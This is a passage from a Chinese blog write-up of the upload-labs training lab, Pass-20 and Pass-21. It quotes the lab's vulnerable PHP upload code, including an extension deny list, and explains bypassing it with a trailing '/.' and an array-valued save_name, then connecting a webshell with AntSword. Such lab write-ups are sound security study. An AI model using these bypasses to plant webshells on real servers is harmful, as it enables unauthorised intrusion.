php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line">        <span class="comment">// 获取后缀名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="comment">// 与黑名单进行匹配</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出本关使用的是黑名单，并且没有之前关卡的层层过滤，只是简单的匹配不到后缀名后即可成功上传。因此本关的解法就有非常多了，包括但不限于之前所使用过的大小写绕过、加点绕过和 <kbd>%00</kbd> 绕过等。</p></li><li><p>与往常一样，本关不会采用已经使用过的方法。本关可以利用 <kbd>move_uploaded_file</kbd> 函数的另外一个特性，即忽略文件末尾的 <kbd>/.</kbd>。</p></li></ul><h3 id="突破限制-21">突破限制</h3><ul><li><p>直接在文件名末尾加上 <kbd>/.</kbd>，当然本地文件如何命名已经无所谓了，毕竟上传之后文件名是啥是由我们自己决定的。</p><img src="https://bu.dusays.com/2022/05/23/628b362cb20b3.webp" alt="" style="zoom:75%"></li><li><p>然后就上传成功了。</p></li></ul><h3 id="夺旗-19">夺旗</h3><ul><li><p>蚁剑连接，当然连接 <kbd>.php</kbd> 后缀木马即可，毕竟 <kbd>/.</kbd> 已经被忽略了。</p><img src="https://bu.dusays.com/2022/05/23/628b362fc49e8.webp" alt="" style="zoom:75%"></li><li><p>依旧本地无旗，继续看个视频。</p><div style="position:relative;width:100%;height:0;padding-bottom:75%"><iframe src="//player.bilibili.com/player.html?aid=937308823&bvid=BV1BT4y1U79r&cid=552445110&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></div></li></ul><h2 id="Pass-21">Pass-21</h2><h3 id="启动靶机-31">启动靶机</h3><ul><li><p>最后一关！</p><img src="https://bu.dusays.com/2022/05/23/628b3631ed3ee.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-15">研究页面</h3><ul><li><p>直接查看源码，最后一关慢慢审计。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>首先定义了 MIME 白名单，通过 <kbd>&#36;_FILES&#91;'upload_file'&#93;&#91;'type'&#93;</kbd> 获取文件 MIME 类型并与白名单比对，若匹配失败则『禁止上传』：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>MIME 匹配成功之后就开始检查文件名，首先通过 <kbd>empty(&#36;&#95;POST[save_name])</kbd> 判断用户是否指定了文件名，若未指定则以上传文件的初始文件名来命名，即 <kbd>&#36;&#95;FILES&#91;'upload_file'&#93;&#91;'name'&#93;</kbd>，若指定了则使用指定文件名进行命名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br></pre></td></tr></table></figure></li><li><p>然后判断文件名是否为数组，若非数组则通过 <kbd>explode()</kbd> 函数将文件名分隔为数组，分隔字符为 <kbd>.</kbd>，同时通过 <kbd>strtolower()</kbd> 函数将所有字母小写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">	<span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接着使用 <kbd>end()</kbd> 函数取文件名数组的最后一个元素，也就是后缀名，与定义好的后缀名白名单进行比对，若匹配失败，则『禁止上传』：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">	<span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接下来就是文件名的最终确定，首先通过 <kbd>reset()</kbd> 函数获取数组中的第一个元素并与 <kbd>&#36;file[count(&#36;file) - 1]</kbd> 函数返回的元素以点相连接成为最终的文件名。其中 <kbd>count()</kbd> 返回数组的元素数量，也就是说，<kbd>&#36;file[count(&#36;file) - 1]</kbd> 原则上获取到的就是后缀名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure></li><li><p>最后一段代码就是例行的标准上传动作：获取路径并将临时文件移入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">	<span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	<span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以发现，最终文件命名将只保留数组首末元素，而如果传入的文件名本身就是一个数组，则 <kbd>explode()</kbd> 函数将不起作用。这时就可以定制数组的内容！注意最终文件名的合成，使用的是 <kbd>&#36;file[count(&#36;file) - 1]</kbd> 而不是 <kbd>end()</kbd> 函数，而 <kbd>count()</kbd> 返回元素数量并不包括数组中的空元素。也就是说，如果数组中包含空元素，最终合成的后缀名就可以定制，且只需保证数组末元素为合法后缀名即可成功上传！</p></li></ul><h3 id="突破限制-22">突破限制</h3><ul><li><p>要将文件名构造成数组，就需要抓包了，因此，打开 <kbd>Burp Suite</kbd> 抓包！由于有 MIME 检查，因此原文件名应伪装为合法图片文件。图示位置即上传时所指定的文件名及初始文件名：</p><img src="https://bu.dusays.com/2022/05/23/628b362ea7d8c.webp" alt="" style="zoom:75%"></li><li><p>要将其修改为数组，实际上在 <kbd>save_name</kbd> 变量名后加上 <kbd>[0]</kbd> 即可，其中 <kbd>0</kbd> 表示数组第一个元素，同样后续元素定义则使用 <kbd>save_name[x]</kbd> 其中 <kbd>x</kbd> 为对应索引。当然，后续元素的其他格式均与首元素一样，因此复制粘贴即可：</p><img src="https://bu.dusays.com/2022/05/23/628b362dac620.webp" alt="" style="zoom:75%"><p>值得注意的是，这里并没有定义 <kbd>save_name[1]</kbd> 而是直接定义了 <kbd>save_name[2]</kbd> 为合法数组，这样就在数组中留下了一个空元素，最后 <kbd>&#36;file[count(&#36;file) - 1]</kbd> 就会访问到空元素而导致最终文件名为首元素加点（数组只有两个元素，<kbd>count()</kbd> 函数返回 <strong>2</strong> ），即 <kbd>h-t-m.php.</kbd>。由于末尾的点不解析，因此实际上我们就已经完成了木马的植入了！</p></li><li><p>发包之后即可看到文件上传成功。</p><img src="https://bu.dusays.com/2022/05/23/628b3630e7cc0.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-20">夺旗</h3><ul><li><p>蚁剑连接，实测尾部可以带点，会自动忽略。</p><img src="https://bu.dusays.com/2022/05/23/628b362b8715d.webp" alt="" style="zoom:75%"></li><li><p>依旧本地无旗，最后看个视频。</p><div style="position:relative;width:100%;height:0;padding-bottom:75%"><iframe src="//player.bilibili.com/player.html?aid=424900400&bvid=BV1s3411s7ET&cid=553050440&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></div></li></ul><h2 id="写在后面">写在后面</h2><p>  本来只是想开一篇博文记录通关过程，没想到通关之后已经写了两万多字了。在本文开篇，我甚至不懂文件上传是什么概念，没用过蚁剑，也没用过Burp Suite，一切都是从0开始。在此期间，我不断穿梭在各大搜索引擎之间，很多时候，我的浏览器都是这个样子的：</p><img src="https://bu.dusays.com/2022/05/23/628b61c93ea6f.webp" alt="" style="zoom:75%"><p>  不得不说，互联网中有非常多可用的资源，但却有着许多滥竽充数和敷衍了事，当利用搜索引擎自学时，绝大部分时间就会花在对内容的筛选上。我也不清楚用实战回填知识的方法究竟可不可取，但是至少在本篇期间，文件上传相关概念如洪水猛兽般袭来。不说熟悉掌握了所有知识点，至少不会再让后期的学习存在更多的未知。毕竟，正如笔记中所记录的，任何关卡都没有满足于夺旗，而是如实地记录并解决所遇到的一切问题。</p><p>  由于学校近期任务也越来越多，因此博文基本都是挤时间完成的，前前后后磨了一个多星期，可能会有一些地方不合逻辑甚至出现胡言乱语，如果在这茫茫互联网的小角落有幸被你发现，也请谅解。</p><p>  最后，终于能说出第一关就想说的那句，完结撒花🎉请网安人继续前行！</p><h2 id="参考链接-2">参考链接</h2><div><ol><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略（全）</a><text style="font-size:75%">- 清茶先生，2021-11-07</text></li><li><a target="_blank" rel="noopener" href="https://www.anquanclub.cn/759.html">buu刷题笔记之文件上传漏洞全集-Upload-labs通关手册</a><text style="font-size:75%">- 沐寒，2022-02-28</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_47598409/article/details/115050869">Upload-labs 1-21关 靶场通关攻略(全网最全最完整)</a><text style="font-size:75%">- 晚安這個未知的世界，2021-03-21</text></li><li><a target="_blank" rel="noopener" href="https://www.caicaizi.top/archives/493">Upload-labs通关详解</a><text style="font-size:75%">- Q_ray，2021-03-21</text></li><li><a target="_blank" rel="noopener" href="https://www.smi1e.top/2019/02/07/upload-labs-20%E5%85%B3%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">Upload-labs 20关通关笔记</a><text style="font-size:75%">- Smi1e，2019-02-07</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a><text style="font-size:75%">- Thunder_sec，2020-10-07</text></li><li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/10/upload.html">国光的文件上传靶场知识总结</a><text style="font-size:75%">- 国光，2020-10-25</text></li><li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-tutorial.html">PHP 教程</a><text style="font-size:75%">- 菜鸟教程</text></li><li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/701882/what-is-ansi-format">What is ANSI format?</a><text style="font-size:75%">- Stack Overflow，2015-05-14</text></li><li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/index.php">PHP 手册</a><text style="font-size:75%">- Manual，2022-05-25</text></li><li><a target="_blank" rel="noopener" href="http://www.jinbuguo.com/php/php.ini.html">php.ini 中文版 (PHP7,PHP8)</a><text style="font-size:75%">- 金步国</text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lidabo/p/3701197.html">PNG文件结构分析</a><text style="font-size:75%">- DoubleLi，2014-04-30</text></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wzy198852/article/details/17266507">gif 格式图片详细解析结</a><text style="font-size:75%">- C_peter，2013-12-11</text></li><li><a target="_blank" rel="noopener" href="https://github.com/monstra-cms/monstra/issues/429">Some extension can bypassed...</a><text style="font-size:75%">- monstra-cms/monstra(github.com)，2018-01-29</text></li><li><a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/8ea0fbfb04a1b0717fd5dd57.html">JPEG 文件数据结构以及将位图保存为JPG 的代码</a><text style="font-size:75%">- 百度文库</text></li><li><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword/blob/master/README_CN.md">中国蚁剑</a><text style="font-size:75%">- (github.com)，2021-07-25</text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lxfweb/p/14847358.html">上传靶机实战之upload-labs解题</a><text style="font-size:75%">- 雪痕，2021-06-03</text></li><li><a target="_blank" rel="noopener" href="http://www.libpng.org/pub/png/">PNG (Portable Network Graphics) Home Site</a><text style="font-size:75%"></text></li><li><a target="_blank" rel="noopener" href="https://libgd.github.io/manuals/2.3.1/files/preamble-txt.html">About LibGD 2.3.1</a><text style="font-size:75%"></text></li><li><a target="_blank" rel="noopener" href="https://zhuanlan.kanxue.com/article-13074.htm">php imagecreatefrom* 系列函数之 png</a><text style="font-size:75%">- janes，2016-05-20</text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linfangnan/p/13588709.html">CTF-WEB：文件上传和 webshellg</a><text style="font-size:75%">- 乌漆WhiteMoon，2020-09-01</text></li><li><a target="_blank" rel="noopener" href="https://windows.php.net/downloads/releases/archives/">windows.php.net</a><text style="font-size:75%"></text></li><li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/52964319/c-apache24-conf-httpd-conf-cannot-load-c-php7-php7apache2-dll-into-server-th">php - C:/Apache24/conf/httpd...</a><text style="font-size:75%">- Stack Overflow，2018-10-24</text></li><li><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15127661/4081404">Apache解析漏洞详解</a><text style="font-size:75%">- mob60475700baf7，2016-01-09</text></li><li><a target="_blank" rel="noopener" href="https://www.lirongyaoper.com/phpxiangguan/41.html">CGI、FastCGI和PHP-FPM关系图解</a><text style="font-size:75%">- 荣耀历程，2020-10-24</text></li><li><a target="_blank" rel="noopener" href="https://qastack.cn/superuser/782692/opened-a-jpg-picture-with-notepad-pasted-all-the-text-to-a-new-notepad-file-changed-to-jpg-and-it-no-longer-opens-why">使用记事本打开JPG图片，将所有“文本”粘...</a><text style="font-size:75%">- qastack.cn</text></li><li><a target="_blank" rel="noopener" href="https://www.365seal.com/y/2rndogOPpj.html">php安装（以module方式）</a><text style="font-size:75%">- dgh00，2010-11-27</text></li><li><a target="_blank" rel="noopener" href="https://blog.css8.cn/post/17165113.html">7z apache解析漏洞_upload-labs打关详解</a><text style="font-size:75%">- 白红宇，2021-10-21</text></li><li><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/">Apache HTTP 服务器文档</a><text style="font-size:75%"></text></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gwind/p/8215771.html">各种类型文件头标准编码</a><text style="font-size:75%">- gwind，2018-01-06</text></li></ol></div></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>upload-labs 完整训练</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://h-t-m.top/posts/ddd5444f/">https://h-t-m.top/posts/ddd5444f/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>h-t-m</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-05-04</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-11-05</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="https://pic.h-t-m.ltd/img/upload-labs.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/a080afff/"><img class="prev-cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF 刷题笔记——Basic 2</div></div></a></div><div class="next-post pull-right"><a href="/posts/d575d62b/"><img class="next-cover" src="https://pic.h-t-m.ltd/img/LeetCode.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">LeetCode 刷题笔记——并查集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3989fe45/" title="BUUCTF 刷题笔记——Basic 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">BUUCTF 刷题笔记——Basic 1</div></div></a></div><div><a href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-23</div><div class="title">BUUCTF 刷题笔记——Crypto 1</div></div></a></div><div><a href="/posts/a080afff/" title="BUUCTF 刷题笔记——Basic 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-03</div><div class="title">BUUCTF 刷题笔记——Basic 2</div></div></a></div><div><a href="/posts/bf54f980/" title="BUUCTF 刷题笔记——Misc 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-Misc.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-21</div><div class="title">BUUCTF 刷题笔记——Misc 1</div></div></a></div><div><a href="/posts/72821c8/" title="BUUCTF 刷题笔记——PWN 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-24</div><div class="title">BUUCTF 刷题笔记——PWN 2</div></div></a></div><div><a href="/posts/9e217072/" title="BUUCTF 刷题笔记——PWN 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-22</div><div class="title">BUUCTF 刷题笔记——PWN 1</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/logo.jpg" onerror='this.onerror=null,this.src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="author-info__name">h-t-m</div><div class="author-info__description">个人博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h-t-m"><i class="fab fa-github"></i><span>找我玩~</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h-t-m/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" 